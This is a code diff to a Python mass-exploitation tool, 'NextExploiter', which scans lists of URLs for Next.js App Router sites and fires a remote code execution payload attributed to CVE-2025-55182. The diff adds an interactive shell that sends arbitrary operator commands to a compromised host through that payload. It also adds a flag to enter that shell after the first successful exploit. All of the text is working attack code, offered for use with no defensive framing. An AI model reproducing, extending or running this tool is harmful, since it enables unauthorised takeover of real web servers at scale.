@@ -66,7 +66,7 @@ class NextExploiter:
         }
         self.proxies = {"http": proxy, "https": proxy} if proxy else None
 
-    def scan_and_exploit(self, target_url):
+    def scan_and_exploit(self, target_url, auto_shell=False):
         try:
             # Phase 1: Deep Detection
             try:
@@ -76,7 +76,7 @@ class NextExploiter:
             except Exception:
                 if self.verbose:
                     print(f"{Colors.GREY}[-] {target_url} : Unreachable{Colors.RESET}")
-                return
+                return False
 
             is_nextjs = False
             is_vulnerable_arch = False
@@ -103,23 +103,29 @@ class NextExploiter:
 
             # Logic Gate
             if not is_nextjs:
-                return # Not a Next.js site, skip silently to keep output clean
+                return False # Not a Next.js site, skip silently to keep output clean
 
             if not is_vulnerable_arch:
                 if self.verbose:
                     print(f"{Colors.YELLOW}[SAFE] {target_url} (Next.js Found but Legacy/Pages Router){Colors.RESET}")
-                return
+                return False
 
             # Phase 2: Exploitation (Only if App Router Detected)
             if self.verbose:
                 print(f"{Colors.CYAN}[*] {target_url} identified as App Router. Attempting exploit...{Colors.RESET}")
                 
-            self.trigger_rce(target_url)
+            success, _ = self.trigger_rce(target_url)
+            if success and auto_shell:
+                # Drop into interactive shell for the compromised host
+                self.interactive_shell(target_url)
+            return success
 
         except Exception as e:
-            pass
+            return False
 
-    def trigger_rce(self, target_url):
+    def trigger_rce(self, target_url, cmd=None):
+        # Allow interactive commands; fall back to default
+        cmd_to_run = cmd or self.cmd
         target_ep = urljoin(target_url, "/adfa")
         
         # CVE-2025-55182 Payload
@@ -130,7 +136,7 @@ class NextExploiter:
             'throw Object.assign(new Error(\'x\'),{{digest: res}});","_chunks":"$Q2",'
             '"_formData":{{"get":"$1:constructor:constructor"}}}}}}'
         )
-        json_payload = payload_template.format(cmd=self.cmd)
+        json_payload = payload_template.format(cmd=cmd_to_run)
         boundary = "----NextRceMitsecOps"
         
         body = (
@@ -167,13 +173,40 @@ class NextExploiter:
                     
                     print(f"{Colors.GREEN}[VULN] {target_url} >>> RCE SUCCESS{Colors.RESET}")
                     print(f"{Colors.GREY}       Output: {decoded}{Colors.RESET}")
+                    return True, decoded
                 except:
-                    pass
+                    return False, None
             elif self.verbose:
                 print(f"{Colors.BLUE}[FAIL] {target_url} (Exploit failed - WAF or Patched){Colors.RESET}")
+            return False, None
 
         except Exception:
-            pass
+            return False, None
+
+    def interactive_shell(self, target_url):
+        """
+        Simple interactive loop to execute arbitrary commands on a compromised target.
+        Exits on EOF/CTRL+C or when user types an exit keyword.
+        """
+        print(f"{Colors.YELLOW}[SHELL] Connected to {target_url}. Type 'exit' to leave the shell.{Colors.RESET}")
+        while True:
+            try:
+                cmd = input(f"{Colors.BOLD}{target_url}$ {Colors.RESET}").strip()
+            except (KeyboardInterrupt, EOFError):
+                print()  # newline for cleanliness
+                break
+
+            if not cmd:
+                continue
+
+            if cmd.lower() in {"exit", "quit", "q"}:
+                break
+
+            success, output = self.trigger_rce(target_url, cmd=cmd)
+            if success and output is not None:
+                print(f"{Colors.GREY}{output}{Colors.RESET}")
+            else:
+                print(f"{Colors.RED}[!] Command failed or blocked{Colors.RESET}")
 
 def main():
     print_banner()
@@ -184,6 +217,7 @@ def main():
     parser.add_argument("-t", "--threads", type=int, default=30, help="Number of threads (default: 30)")
     parser.add_argument("-p", "--proxy", help="HTTP Proxy (e.g., http://127.0.0.1:8080)")
     parser.add_argument("-v", "--verbose", action="store_true", help="Show failed attempts and non-vulnerable targets")
+    parser.add_argument("-i", "--shell", action="store_true", help="Drop into interactive shell after first successful exploit")
     
     args = parser.parse_args()
     
@@ -214,6 +248,17 @@ def main():
     print(f"{Colors.GREY}[*] Payload Command: {args.cmd}{Colors.RESET}\n")
 
     scanner = NextExploiter(cmd=args.cmd, timeout=8, proxy=args.proxy, verbose=args.verbose)
+
+    # Interactive mode triggers only when explicitly requested
+    interactive_mode = args.shell
+
+    if interactive_mode:
+        # Run sequentially to avoid input clashes with threadpool
+        for target in targets:
+            success = scanner.scan_and_exploit(target, auto_shell=True)
+            if success:
+                break  # stop after first successful exploit + shell
+        return
 
     with ThreadPoolExecutor(max_workers=args.threads) as executor:
         executor.map(scanner.scan_and_exploit, targets)
